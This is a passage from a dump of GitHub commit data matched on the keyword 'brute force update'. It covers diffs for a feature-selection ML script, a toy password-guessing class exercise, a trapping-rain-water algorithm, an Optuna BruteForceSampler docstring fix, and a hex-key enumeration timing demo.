np\r import pandas as pd\r from sklearn.preprocessing import MinMaxScaler\r from xgboost import XGBRegressor\r from sklearn.model_selection import KFold, train_test_split, GridSearchCV\r from sklearn.metrics import confusion_matrix, mean_squared_error\r from sklearn.ensemble import RandomForestRegressor\r from sklearn.svm import SVR\r from sklearn.metrics import mean_squared_error\r from math import log\r from sklearn.neighbors import KNeighborsClassifier\r from sklearn.datasets import load_iris\r from mlxtend.feature_selection import ExhaustiveFeatureSelector as EFS\r import pandas as pd\r \r train=pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\The_hand_crafted\\\\ANN\\\\Train.csv')\r \r y=np.array(train.iloc[:, 14], dtype=float)\r X=train.iloc[:,[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]].values\r \r \r lr=XGBRegressor(random_state=1)\r \r efs=EFS(lr,\r min_features=4,\r max_features=4,\r scoring='neg_mean_squared_error',\r print_progress=True,\r cv=5)\r \r df_X=pd.DataFrame(X, columns=['ASA','BGN','RMSENG','ZCR','MFCC1','MFCC2','MFCC4','MFCC8','S_Decrease','S_Flatness','S_Flux','S_Rolloff','S_Slope','S_Spread'])\r df_X.head()\r \r efs1=efs.fit(df_X, y)\r \r print('Best MSE score: %.4f' % efs1.best_score_ *(-1))\r print('Best subset(indices):', efs1.best_idx_)\r print('Best subset(corresponding names):', efs1.best_feature_names_)\r \r ","sourceWithComments":"import numpy as np\r\nimport pandas as pd\r\nfrom sklearn.preprocessing import MinMaxScaler\r\nfrom xgboost import XGBRegressor\r\nfrom sklearn.model_selection import KFold, train_test_split, GridSearchCV\r\nfrom sklearn.metrics import confusion_matrix, mean_squared_error\r\nfrom sklearn.ensemble import RandomForestRegressor\r\nfrom sklearn.svm import SVR\r\nfrom sklearn.metrics import mean_squared_error\r\nfrom math import log\r\nfrom sklearn.neighbors import KNeighborsClassifier\r\nfrom sklearn.datasets import load_iris\r\nfrom mlxtend.feature_selection import ExhaustiveFeatureSelector as EFS\r\nimport pandas as pd\r\n\r\ntrain = pd.read_csv('C:\\\\Users\\\\Momo\\\\Desktop\\\\The_hand_crafted\\\\ANN\\\\Train.csv')\r\n\r\ny = np.array(train.iloc[:, 14], dtype=float)\r\nX = train.iloc[:, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]].values\r\n\r\n\r\nlr = XGBRegressor(random_state=1)\r\n\r\nefs = EFS(lr,\r\n          min_features=4,\r\n          max_features=4,\r\n          scoring='neg_mean_squared_error',\r\n          print_progress=True,\r\n          cv=5)\r\n\r\ndf_X = pd.DataFrame(X, columns=['ASA','BGN','RMSENG','ZCR','MFCC1','MFCC2','MFCC4','MFCC8','S_Decrease','S_Flatness','S_Flux','S_Rolloff','S_Slope','S_Spread'])\r\ndf_X.head()\r\n\r\nefs1 = efs.fit(df_X, y)\r\n\r\nprint('Best MSE score: %.4f' % efs1.best_score_ * (-1))\r\nprint('Best subset (indices):', efs1.best_idx_)\r\nprint('Best subset (corresponding names):', efs1.best_feature_names_)\r\n\r\n"}},"msg":"Update Brute_Force_Feature_Selection.py\n\nSimple python demonstration for feature combination selection"}},"https:\/\/github.com\/GooseKIller\/python_minicodes":{"1ac6ce09783cc019921311436b4bec3b25fc91f5":{"url":"https:\/\/api.github.com\/repos\/GooseKIller\/python_minicodes\/commits\/1ac6ce09783cc019921311436b4bec3b25fc91f5","html_url":"https:\/\/github.com\/GooseKIller\/python_minicodes\/commit\/1ac6ce09783cc019921311436b4bec3b25fc91f5","sha":"1ac6ce09783cc019921311436b4bec3b25fc91f5","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex d2898e7..776e47e 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,7 +1,7 @@\n def passwords():\n     your_list = 'qweasdpro'\n     any_password = []\n-    for current in range(len(your_list)):\n+    for current in range(6):#6 is length of password\n         a = [i for i in your_list]\n         for y in range(current):\n             a = [x + i for i in your_list for x in a]\n@@ -26,7 +26,7 @@ def brute_force(self):\n                 return password\n         return 0\n \n-class System(object):\n+class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password\n     def __init__(self, user,hacker):\n         self.user = user\n         self.hacker = hacker\n@@ -38,5 +38,4 @@ def hack(self):\n     user = User(\"qwepro\")\n     hacker = Hacker()\n     system = System(user, hacker)\n-    system.user.show_me()\n-    print(system.hack())\n+    print(f\"password is {system.hack()}\")\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n def passwords():\n     your_list = 'qweasdpro'\n     any_password = []\n-    for current in range(len(your_list)):\n+    for current in range(6):#6 is length of password\n         a = [i for i in your_list]\n         for y in range(current):\n             a = [x + i for i in your_list for x in a]\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["    for current in range(len(your_list)):"],"goodparts":["    for current in range(6):#6 is length of password"]},{"diff":"\n                 return password\n         return 0\n \n-class System(object):\n+class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password\n     def __init__(self, user,hacker):\n         self.user = user\n         self.hacker = hacker\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["class System(object):"],"goodparts":["class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password"]},{"diff":"\n     user = User(\"qwepro\")\n     hacker = Hacker()\n     system = System(user, hacker)\n-    system.user.show_me()\n-    print(system.hack())\n+    print(f\"password is {system.hack()}\")\n","add":1,"remove":2,"filename":"\/brute_force.py","badparts":["    system.user.show_me()","    print(system.hack())"],"goodparts":["    print(f\"password is {system.hack()}\")"]}],"source":"\ndef passwords(): your_list='qweasdpro' any_password=[] for current in range(len(your_list)): a=[i for i in your_list] for y in range(current): a=[x +i for i in your_list for x in a] any_password=any_password +a return(any_password) class User(object): def __init__(self,password): self.password=password def show_me(self): print(self.password) def is_this(self,word): return self.password==word class Hacker(object): def brute_force(self): any_password=passwords() for password in any_password: if user.is_this(password): return password return 0 class System(object): def __init__(self, user,hacker): self.user=user self.hacker=hacker def hack(self): return hacker.brute_force() if __name__=='__main__': user=User(\"qwepro\") hacker=Hacker() system=System(user, hacker) system.user.show_me() print(system.hack()) ","sourceWithComments":"def passwords():\n    your_list = 'qweasdpro'\n    any_password = []\n    for current in range(len(your_list)):\n        a = [i for i in your_list]\n        for y in range(current):\n            a = [x + i for i in your_list for x in a]\n        any_password = any_password + a\n    return (any_password)\n\nclass User(object):\n    def __init__(self,password):\n        self.password = password\n\n    def show_me(self):\n        print(self.password)\n\n    def is_this(self,word):\n        return self.password == word\n\nclass Hacker(object):\n    def brute_force(self):\n        any_password = passwords()\n        for password in any_password:\n            if user.is_this(password):\n                return password\n        return 0\n\nclass System(object):\n    def __init__(self, user,hacker):\n        self.user = user\n        self.hacker = hacker\n    def hack(self):\n        return hacker.brute_force()\n\n\nif __name__ == '__main__':\n    user = User(\"qwepro\")\n    hacker = Hacker()\n    system = System(user, hacker)\n    system.user.show_me()\n    print(system.hack())\n"}},"msg":"Update brute_force.py"},"9f85f941cc32baa891e3625c39af11207d51d774":{"url":"https:\/\/api.github.com\/repos\/GooseKIller\/python_minicodes\/commits\/9f85f941cc32baa891e3625c39af11207d51d774","html_url":"https:\/\/github.com\/GooseKIller\/python_minicodes\/commit\/9f85f941cc32baa891e3625c39af11207d51d774","sha":"9f85f941cc32baa891e3625c39af11207d51d774","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex 776e47e..e0ab933 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -1,41 +1,48 @@\n-def passwords():\n-    your_list = 'qweasdpro'\n-    any_password = []\n-    for current in range(6):#6 is length of password\n-        a = [i for i in your_list]\n-        for y in range(current):\n-            a = [x + i for i in your_list for x in a]\n-        any_password = any_password + a\n-    return (any_password)\n-\n class User(object):\n-    def __init__(self,password):\n-        self.password = password\n+    def __init__(self, name, user_password):\n+        self.name = name\n+        self.__password = user_password\n \n-    def show_me(self):\n-        print(self.password)\n+    def is_this(self, word):\n+        return self.__password == word\n \n-    def is_this(self,word):\n-        return self.password == word\n \n class Hacker(object):\n+    @staticmethod\n+    def __passwords():\n+        your_list = 'qwertyasdfg123456789'\n+        any_password = []\n+        for current in range(6):\n+            a = [i for i in your_list]\n+            for y in range(current):\n+                a = [x + i for i in your_list for x in a]\n+            any_password += a\n+        return any_password\n+\n     def brute_force(self):\n-        any_password = passwords()\n-        for password in any_password:\n-            if user.is_this(password):\n-                return password\n+        any_password = self.__passwords()\n+        print(\"Process started...\")\n+        for passwords in any_password:\n+            if user.is_this(passwords):\n+                print(\"Process finished\")\n+                return passwords\n         return 0\n \n-class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password\n-    def __init__(self, user,hacker):\n-        self.user = user\n-        self.hacker = hacker\n+\n+class System(object):\n+    def __init__(self, userman, hackerman):\n+        self.user = userman\n+        self.hacker = hackerman\n+\n+    @property\n     def hack(self):\n         return hacker.brute_force()\n \n \n if __name__ == '__main__':\n-    user = User(\"qwepro\")\n+    username = input(\"login:\")\n+    password = input(\"password:\")\n+    user = User(username, password)\n     hacker = Hacker()\n     system = System(user, hacker)\n-    print(f\"password is {system.hack()}\")\n+    print(f\"User:{user.name} has password: {system.hack}\")\n","message":"","files":{"\/brute_force.py":{"changes":[{"diff":"\n-def passwords():\n-    your_list = 'qweasdpro'\n-    any_password = []\n-    for current in range(6):#6 is length of password\n-        a = [i for i in your_list]\n-        for y in range(current):\n-            a = [x + i for i in your_list for x in a]\n-        any_password = any_password + a\n-    return (any_password)\n-\n class User(object):\n-    def __init__(self,password):\n-        self.password = password\n+    def __init__(self, name, user_password):\n+        self.name = name\n+        self.__password = user_password\n \n-    def show_me(self):\n-        print(self.password)\n+    def is_this(self, word):\n+        return self.__password == word\n \n-    def is_this(self,word):\n-        return self.password == word\n \n class Hacker(object):\n+    @staticmethod\n+    def __passwords():\n+        your_list = 'qwertyasdfg123456789'\n+        any_password = []\n+        for current in range(6):\n+            a = [i for i in your_list]\n+            for y in range(current):\n+                a = [x + i for i in your_list for x in a]\n+            any_password += a\n+        return any_password\n+\n     def brute_force(self):\n-        any_password = passwords()\n-        for password in any_password:\n-            if user.is_this(password):\n-                return password\n+        any_password = self.__passwords()\n+        print(\"Process started...\")\n+        for passwords in any_password:\n+            if user.is_this(passwords):\n+                print(\"Process finished\")\n+                return passwords\n         return 0\n \n-class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password\n-    def __init__(self, user,hacker):\n-        self.user = user\n-        self.hacker = hacker\n+\n+class System(object):\n+    def __init__(self, userman, hackerman):\n+        self.user = userman\n+        self.hacker = hackerman\n+\n+    @property\n     def hack(self):\n         return hacker.brute_force()\n \n \n if __name__ == '__main__':\n-    user = User(\"qwepro\")\n+    username = input(\"login:\")\n+    password = input(\"password:\")\n+    user = User(username, password)\n     hacker = Hacker()\n     system = System(user, hacker)\n-    print(f\"password is {system.hack()}\")\n+    print(f\"User:{user.name} has password: {system.hack}\")\n","add":33,"remove":26,"filename":"\/brute_force.py","badparts":["def passwords():","    your_list = 'qweasdpro'","    any_password = []","    for current in range(6):#6 is length of password","        a = [i for i in your_list]","        for y in range(current):","            a = [x + i for i in your_list for x in a]","        any_password = any_password + a","    return (any_password)","    def __init__(self,password):","        self.password = password","    def show_me(self):","        print(self.password)","    def is_this(self,word):","        return self.password == word","        any_password = passwords()","        for password in any_password:","            if user.is_this(password):","                return password","class System(object):#in this class we have user and hacker because without this class hacker can't see renamed password","    def __init__(self, user,hacker):","        self.user = user","        self.hacker = hacker","    user = User(\"qwepro\")","    print(f\"password is {system.hack()}\")"],"goodparts":["    def __init__(self, name, user_password):","        self.name = name","        self.__password = user_password","    def is_this(self, word):","        return self.__password == word","    @staticmethod","    def __passwords():","        your_list = 'qwertyasdfg123456789'","        any_password = []","        for current in range(6):","            a = [i for i in your_list]","            for y in range(current):","                a = [x + i for i in your_list for x in a]","            any_password += a","        return any_password","        any_password = self.__passwords()","        print(\"Process started...\")","        for passwords in any_password:","            if user.is_this(passwords):","                print(\"Process finished\")","                return passwords","class System(object):","    def __init__(self, userman, hackerman):","        self.user = userman","        self.hacker = hackerman","    @property","    username = input(\"login:\")","    password = input(\"password:\")","    user = User(username, password)","    print(f\"User:{user.name} has password: {system.hack}\")"]}],"source":"\ndef passwords(): your_list='qweasdpro' any_password=[] for current in range(6): a=[i for i in your_list] for y in range(current): a=[x +i for i in your_list for x in a] any_password=any_password +a return(any_password) class User(object): def __init__(self,password): self.password=password def show_me(self): print(self.password) def is_this(self,word): return self.password==word class Hacker(object): def brute_force(self): any_password=passwords() for password in any_password: if user.is_this(password): return password return 0 class System(object): def __init__(self, user,hacker): self.user=user self.hacker=hacker def hack(self): return hacker.brute_force() if __name__=='__main__': user=User(\"qwepro\") hacker=Hacker() system=System(user, hacker) print(f\"password is{system.hack()}\") ","sourceWithComments":"def passwords():\n    your_list = 'qweasdpro'\n    any_password = []\n    for current in range(6):#6 is length of password\n        a = [i for i in your_list]\n        for y in range(current):\n            a = [x + i for i in your_list for x in a]\n        any_password = any_password + a\n    return (any_password)\n\nclass User(object):\n    def __init__(self,password):\n        self.password = password\n\n    def show_me(self):\n        print(self.password)\n\n    def is_this(self,word):\n        return self.password == word\n\nclass Hacker(object):\n    def brute_force(self):\n        any_password = passwords()\n        for password in any_password:\n            if user.is_this(password):\n                return password\n        return 0\n\nclass System(object):#in this class we have user and hacker because without this class hacker can't see renamed password\n    def __init__(self, user,hacker):\n        self.user = user\n        self.hacker = hacker\n    def hack(self):\n        return hacker.brute_force()\n\n\nif __name__ == '__main__':\n    user = User(\"qwepro\")\n    hacker = Hacker()\n    system = System(user, hacker)\n    print(f\"password is {system.hack()}\")\n"}},"msg":"Update brute_force.py"},"ff3afa75f52d1ebca9e283ff1651967232d46252":{"url":"https:\/\/api.github.com\/repos\/GooseKIller\/python_minicodes\/commits\/ff3afa75f52d1ebca9e283ff1651967232d46252","html_url":"https:\/\/github.com\/GooseKIller\/python_minicodes\/commit\/ff3afa75f52d1ebca9e283ff1651967232d46252","message":"Update brute_force.py","sha":"ff3afa75f52d1ebca9e283ff1651967232d46252","keyword":"brute force update","diff":"diff --git a\/brute_force.py b\/brute_force.py\nindex e0ab933..f0a5176 100644\n--- a\/brute_force.py\n+++ b\/brute_force.py\n@@ -10,7 +10,7 @@ def is_this(self, word):\n class Hacker(object):\n     @staticmethod\n     def __passwords():\n-        your_list = 'qwertyasdfg123456789'\n+        your_list = \"qwertyasd123456789\"\n         any_password = []\n         for current in range(6):\n             a = [i for i in your_list]\n","files":{"\/brute_force.py":{"changes":[{"diff":"\n class Hacker(object):\n     @staticmethod\n     def __passwords():\n-        your_list = 'qwertyasdfg123456789'\n+        your_list = \"qwertyasd123456789\"\n         any_password = []\n         for current in range(6):\n             a = [i for i in your_list]\n","add":1,"remove":1,"filename":"\/brute_force.py","badparts":["        your_list = 'qwertyasdfg123456789'"],"goodparts":["        your_list = \"qwertyasd123456789\""]}],"source":"\nclass User(object): def __init__(self, name, user_password): self.name=name self.__password=user_password def is_this(self, word): return self.__password==word class Hacker(object): @staticmethod def __passwords(): your_list='qwertyasdfg123456789' any_password=[] for current in range(6): a=[i for i in your_list] for y in range(current): a=[x +i for i in your_list for x in a] any_password +=a return any_password def brute_force(self): any_password=self.__passwords() print(\"Process started...\") for passwords in any_password: if user.is_this(passwords): print(\"Process finished\") return passwords return 0 class System(object): def __init__(self, userman, hackerman): self.user=userman self.hacker=hackerman @property def hack(self): return hacker.brute_force() if __name__=='__main__': username=input(\"login:\") password=input(\"password:\") user=User(username, password) hacker=Hacker() system=System(user, hacker) print(f\"User:{user.name} has password:{system.hack}\") ","sourceWithComments":"class User(object):\n    def __init__(self, name, user_password):\n        self.name = name\n        self.__password = user_password\n\n    def is_this(self, word):\n        return self.__password == word\n\n\nclass Hacker(object):\n    @staticmethod\n    def __passwords():\n        your_list = 'qwertyasdfg123456789'\n        any_password = []\n        for current in range(6):\n            a = [i for i in your_list]\n            for y in range(current):\n                a = [x + i for i in your_list for x in a]\n            any_password += a\n        return any_password\n\n    def brute_force(self):\n        any_password = self.__passwords()\n        print(\"Process started...\")\n        for passwords in any_password:\n            if user.is_this(passwords):\n                print(\"Process finished\")\n                return passwords\n        return 0\n\n\nclass System(object):\n    def __init__(self, userman, hackerman):\n        self.user = userman\n        self.hacker = hackerman\n\n    @property\n    def hack(self):\n        return hacker.brute_force()\n\n\nif __name__ == '__main__':\n    username = input(\"login:\")\n    password = input(\"password:\")\n    user = User(username, password)\n    hacker = Hacker()\n    system = System(user, hacker)\n    print(f\"User:{user.name} has password: {system.hack}\")\n"}},"msg":"Update brute_force.py"}},"https:\/\/github.com\/siddhant-shekhar\/trapping_rain_water_problem":{"9840628846b52e282d7dd8793a1a1678febbae5f":{"url":"https:\/\/api.github.com\/repos\/siddhant-shekhar\/trapping_rain_water_problem\/commits\/9840628846b52e282d7dd8793a1a1678febbae5f","html_url":"https:\/\/github.com\/siddhant-shekhar\/trapping_rain_water_problem\/commit\/9840628846b52e282d7dd8793a1a1678febbae5f","message":"Update 1_brute_force_approach.py","sha":"9840628846b52e282d7dd8793a1a1678febbae5f","keyword":"brute force update","diff":"diff --git a\/1_brute_force_approach.py b\/1_brute_force_approach.py\nindex 1c5171f..707c1b9 100644\n--- a\/1_brute_force_approach.py\n+++ b\/1_brute_force_approach.py\n@@ -1,6 +1,6 @@\n # siddhant\r\n # Python3 implementation of the brute force approach\r\n-# Time Complexity: O(N2)\r\n+# Time Complexity: O(N^2)\r\n # Space Complexity: O(1)\r\n   \r\n # Function to return the maximum\r\n@@ -38,4 +38,4 @@ def maxWater(arr, n):\n            1, 3, 2, 1, 2, 1]\r\n     n = len(arr)\r\n   \r\n-    print(maxWater(arr, n))\n\\ No newline at end of file\n+    print(maxWater(arr, n))\r\n","files":{"\/1_brute_force_approach.py":{"changes":[{"diff":"\n            1, 3, 2, 1, 2, 1]\r\n     n = len(arr)\r\n   \r\n-    print(maxWater(arr, n))\n\\ No newline at end of file\n+    print(maxWater(arr, n))\r\n","add":1,"remove":1,"filename":"\/1_brute_force_approach.py","badparts":["    print(maxWater(arr, n))"],"goodparts":["    print(maxWater(arr, n))\r"]}],"source":"\n \r def maxWater(arr, n):\r \r res=0\r \r for i in range(1, n -1):\r \r left=arr[i]\r for j in range(i):\r left=max(left, arr[j])\r \r right=arr[i]\r \r for j in range(i +1, n):\r right=max(right, arr[j])\r \r res=res +(min(left, right) -arr[i])\r \r return res\r \r \r if __name__==\"__main__\":\r \r arr=[0, 1, 0, 2, 1, 0,\r 1, 3, 2, 1, 2, 1]\r n=len(arr)\r \r print(maxWater(arr, n)) ","sourceWithComments":"# siddhant\r\n# Python3 implementation of the brute force approach\r\n# Time Complexity: O(N2)\r\n# Space Complexity: O(1)\r\n  \r\n# Function to return the maximum\r\n# water that can be stored\r\ndef maxWater(arr, n):\r\n  \r\n    # To store the maximum water\r\n    # that can be stored\r\n    res = 0\r\n  \r\n    # For every element of the array\r\n    for i in range(1, n - 1):\r\n  \r\n        # Find the maximum element on its left\r\n        left = arr[i]\r\n        for j in range(i):\r\n            left = max(left, arr[j])\r\n  \r\n        # Find the maximum element on its right\r\n        right = arr[i]\r\n  \r\n        for j in range(i + 1, n):\r\n            right = max(right, arr[j])\r\n  \r\n        # Update the maximum water\r\n        res = res + (min(left, right) - arr[i])\r\n  \r\n    return res\r\n  \r\n  \r\n# Driver code\r\nif __name__ == \"__main__\":\r\n  \r\n    arr = [0, 1, 0, 2, 1, 0,\r\n           1, 3, 2, 1, 2, 1]\r\n    n = len(arr)\r\n  \r\n    print(maxWater(arr, n))"}},"msg":"Update 1_brute_force_approach.py"}},"https:\/\/github.com\/optuna\/optuna":{"a1f2150db46d2c2d531d90f413b5c6869f401701":{"url":"https:\/\/api.github.com\/repos\/optuna\/optuna\/commits\/a1f2150db46d2c2d531d90f413b5c6869f401701","html_url":"https:\/\/github.com\/optuna\/optuna\/commit\/a1f2150db46d2c2d531d90f413b5c6869f401701","sha":"a1f2150db46d2c2d531d90f413b5c6869f401701","keyword":"brute force update","diff":"diff --git a\/optuna\/samplers\/_brute_force.py b\/optuna\/samplers\/_brute_force.py\nindex 14947e0a7f..d544cd4e7f 100644\n--- a\/optuna\/samplers\/_brute_force.py\n+++ b\/optuna\/samplers\/_brute_force.py\n@@ -32,7 +32,7 @@ class BruteForceSampler(BaseSampler):\n         For example, the sampler may fail to try the entire search space in the following cases.\n \n         * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n-        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n+        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`\n \n     Args:\n         seed:\n","message":"","files":{"\/optuna\/samplers\/_brute_force.py":{"changes":[{"diff":"\n         For example, the sampler may fail to try the entire search space in the following cases.\n \n         * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n-        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n+        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`\n \n     Args:\n         seed:\n","add":1,"remove":1,"filename":"\/optuna\/samplers\/_brute_force.py","badparts":["        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`"],"goodparts":["        * Changing suggestion ranges or adding parameters in the same :class:`~optuna.study.Study`"]}],"source":"\nimport decimal from typing import Any from typing import Dict from typing import Optional from typing import Sequence import numpy as np from optuna._experimental import experimental_class from optuna.distributions import BaseDistribution from optuna.distributions import CategoricalDistribution from optuna.distributions import FloatDistribution from optuna.distributions import IntDistribution from optuna.samplers import BaseSampler from optuna.study import Study from optuna.trial import FrozenTrial from optuna.trial import TrialState @experimental_class(\"3.1.0\") class BruteForceSampler(BaseSampler): \"\"\"Sampler using brute force. This sampler performs exhaustive search on the defined search space. Note: The defined search space must be finite. Therefore, when using :class:`~optuna.distributions.FloatDistibution`, ``step=None`` is not allowed. Note: This sampler assumes that it suggests all parameters and that the search space is fixed. For example, the sampler may fail to try the entire search space in the following cases. * Using with other samplers or:meth:`~optuna.study.Study.enqueue_trial` * Changing suggestions range or adding parameters in the same:class:`~optuna.study.Study` Args: seed: A seed to fix the order of trials as the search order randomly shuffled. Please note that it is not recommended using this option in distributed optimization settings since this option cannot ensure the order of trials and may increase the number of duplicate suggestions during distributed optimization. \"\"\" def __init__(self, seed: Optional[int]=None) -> None: self._rng=np.random.RandomState(seed) def infer_relative_search_space( self, study: Study, trial: FrozenTrial ) -> Dict[str, BaseDistribution]: return{} def sample_relative( self, study: Study, trial: FrozenTrial, search_space: Dict[str, BaseDistribution] ) -> Dict[str, Any]: return{} def sample_independent( self, study: Study, trial: FrozenTrial, param_name: str, param_distribution: BaseDistribution, ) -> Any: candidates=_enumerate_candidates(param_distribution) assert len(candidates) > 0 self._rng.shuffle(candidates) for value in candidates[1:]: params=trial.params.copy() params[param_name]=value study.enqueue_trial(params, skip_if_exists=True) return candidates[0] def after_trial( self, study: Study, trial: FrozenTrial, state: TrialState, values: Optional[Sequence[float]], ) -> None: if len(study.get_trials(deepcopy=False, states=(TrialState.WAITING,)))==0: study.stop() def _enumerate_candidates(param_distribution: BaseDistribution) -> Sequence[Any]: if isinstance(param_distribution, FloatDistribution): if param_distribution.step is None: raise ValueError( \"FloatDistribution.step must be given for BruteForceSampler\" \"(otherwise, the search space will be infinite).\" ) low=decimal.Decimal(str(param_distribution.low)) high=decimal.Decimal(str(param_distribution.high)) step=decimal.Decimal(str(param_distribution.step)) ret=[] value=low while value <=high: ret.append(float(value)) value +=step return ret elif isinstance(param_distribution, IntDistribution): return list( range(param_distribution.low, param_distribution.high +1, param_distribution.step) ) elif isinstance(param_distribution, CategoricalDistribution): return list(param_distribution.choices) else: raise ValueError(f\"Unknown distribution{param_distribution}.\") ","sourceWithComments":"import decimal\nfrom typing import Any\nfrom typing import Dict\nfrom typing import Optional\nfrom typing import Sequence\n\nimport numpy as np\n\nfrom optuna._experimental import experimental_class\nfrom optuna.distributions import BaseDistribution\nfrom optuna.distributions import CategoricalDistribution\nfrom optuna.distributions import FloatDistribution\nfrom optuna.distributions import IntDistribution\nfrom optuna.samplers import BaseSampler\nfrom optuna.study import Study\nfrom optuna.trial import FrozenTrial\nfrom optuna.trial import TrialState\n\n\n@experimental_class(\"3.1.0\")\nclass BruteForceSampler(BaseSampler):\n    \"\"\"Sampler using brute force.\n\n    This sampler performs exhaustive search on the defined search space.\n\n    Note:\n        The defined search space must be finite. Therefore, when using\n        :class:`~optuna.distributions.FloatDistibution`, ``step=None`` is not allowed.\n\n    Note:\n        This sampler assumes that it suggests all parameters and that the search space is fixed.\n        For example, the sampler may fail to try the entire search space in the following cases.\n\n        * Using with other samplers or :meth:`~optuna.study.Study.enqueue_trial`\n        * Changing suggestions range or adding parameters in the same :class:`~optuna.study.Study`\n\n    Args:\n        seed:\n            A seed to fix the order of trials as the search order randomly shuffled. Please note\n            that it is not recommended using this option in distributed optimization settings since\n            this option cannot ensure the order of trials and may increase the number of duplicate\n            suggestions during distributed optimization.\n    \"\"\"\n\n    def __init__(self, seed: Optional[int] = None) -> None:\n        self._rng = np.random.RandomState(seed)\n\n    def infer_relative_search_space(\n        self, study: Study, trial: FrozenTrial\n    ) -> Dict[str, BaseDistribution]:\n        return {}\n\n    def sample_relative(\n        self, study: Study, trial: FrozenTrial, search_space: Dict[str, BaseDistribution]\n    ) -> Dict[str, Any]:\n        return {}\n\n    def sample_independent(\n        self,\n        study: Study,\n        trial: FrozenTrial,\n        param_name: str,\n        param_distribution: BaseDistribution,\n    ) -> Any:\n        candidates = _enumerate_candidates(param_distribution)\n        assert len(candidates) > 0\n\n        self._rng.shuffle(candidates)\n\n        for value in candidates[1:]:\n            params = trial.params.copy()\n            params[param_name] = value\n            study.enqueue_trial(params, skip_if_exists=True)\n\n        return candidates[0]\n\n    def after_trial(\n        self,\n        study: Study,\n        trial: FrozenTrial,\n        state: TrialState,\n        values: Optional[Sequence[float]],\n    ) -> None:\n        if len(study.get_trials(deepcopy=False, states=(TrialState.WAITING,))) == 0:\n            study.stop()\n\n\ndef _enumerate_candidates(param_distribution: BaseDistribution) -> Sequence[Any]:\n    if isinstance(param_distribution, FloatDistribution):\n        if param_distribution.step is None:\n            raise ValueError(\n                \"FloatDistribution.step must be given for BruteForceSampler\"\n                \" (otherwise, the search space will be infinite).\"\n            )\n        low = decimal.Decimal(str(param_distribution.low))\n        high = decimal.Decimal(str(param_distribution.high))\n        step = decimal.Decimal(str(param_distribution.step))\n\n        ret = []\n        value = low\n        while value <= high:\n            ret.append(float(value))\n            value += step\n\n        return ret\n    elif isinstance(param_distribution, IntDistribution):\n        return list(\n            range(param_distribution.low, param_distribution.high + 1, param_distribution.step)\n        )\n    elif isinstance(param_distribution, CategoricalDistribution):\n        return list(param_distribution.choices)\n    else:\n        raise ValueError(f\"Unknown distribution {param_distribution}.\")\n"}},"msg":"Update optuna\/samplers\/_brute_force.py\n\nCo-authored-by: Toshihiko Yanase <toshihiko.yanase@gmail.com>"}},"https:\/\/github.com\/YurichS\/blockchain":{"36ff56a2c05162465bb42663a12df405b5197465":{"url":"https:\/\/api.github.com\/repos\/YurichS\/blockchain\/commits\/36ff56a2c05162465bb42663a12df405b5197465","html_url":"https:\/\/github.com\/YurichS\/blockchain\/commit\/36ff56a2c05162465bb42663a12df405b5197465","sha":"36ff56a2c05162465bb42663a12df405b5197465","keyword":"brute force update","diff":"diff --git a\/options_amount_and_BF.py b\/options_amount_and_BF.py\nindex 1acee48..6e390cc 100644\n--- a\/options_amount_and_BF.py\n+++ b\/options_amount_and_BF.py\n@@ -27,13 +27,10 @@ def key_brute_force(key):\n     base = \"{:0\" + str(bit_amount) + \"X}\"\n     while k < 16 ** bit_amount:\n         if base.format(k) == key[2::]:\n-            if key[0] == 0:\n-                finish = time() * 1000\n-            else:\n-                finish = time() * 1000\n+            finish = time() * 1000\n             break\n-\n         k += 1\n     return f\"Brute force time: {finish - start}\"\n \n+\n # print(key_brute_force('Enter your key'))\n","message":"","files":{"\/options_amount_and_BF.py":{"changes":[{"diff":"\n     base = \"{:0\" + str(bit_amount) + \"X}\"\n     while k < 16 ** bit_amount:\n         if base.format(k) == key[2::]:\n-            if key[0] == 0:\n-                finish = time() * 1000\n-            else:\n-                finish = time() * 1000\n+            finish = time() * 1000\n             break\n-\n         k += 1\n     return f\"Brute force time: {finish - start}\"\n \n+\n # print(key_brute_force('Enter your key'))\n","add":2,"remove":5,"filename":"\/options_amount_and_BF.py","badparts":["            if key[0] == 0:","                finish = time() * 1000","            else:","                finish = time() * 1000"],"goodparts":["            finish = time() * 1000"]}],"source":"\nfrom random import choices, choice from time import time def options_amount(): bit_amount=int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): ')) return 2 ** bit_amount def key_generation(): bit_amount=int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): ')) sign_value=[0, 1] hex_numbers=list('0123456789ABCDEF') return str(choice(sign_value)) +'x' +''.join(choices(hex_numbers, k=bit_amount)) def key_brute_force(key): start=int(time() * 1000) bit_amount=len(key[2::]) k=0 base=\"{:0\" +str(bit_amount) +\"X}\" while k < 16 ** bit_amount: if base.format(k)==key[2::]: if key[0]==0: finish=time() * 1000 else: finish=time() * 1000 break k +=1 return f\"Brute force time:{finish -start}\" ","sourceWithComments":"from random import choices, choice\nfrom time import time\n\n\ndef options_amount():\n    bit_amount = int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): '))\n    return 2 ** bit_amount\n\n\n# print(options_amount())\n\n\ndef key_generation():\n    bit_amount = int(input('How many bits in sequence?(8,16,32,64,128,256,512,1024,2048,4096): '))\n    sign_value = [0, 1]\n    hex_numbers = 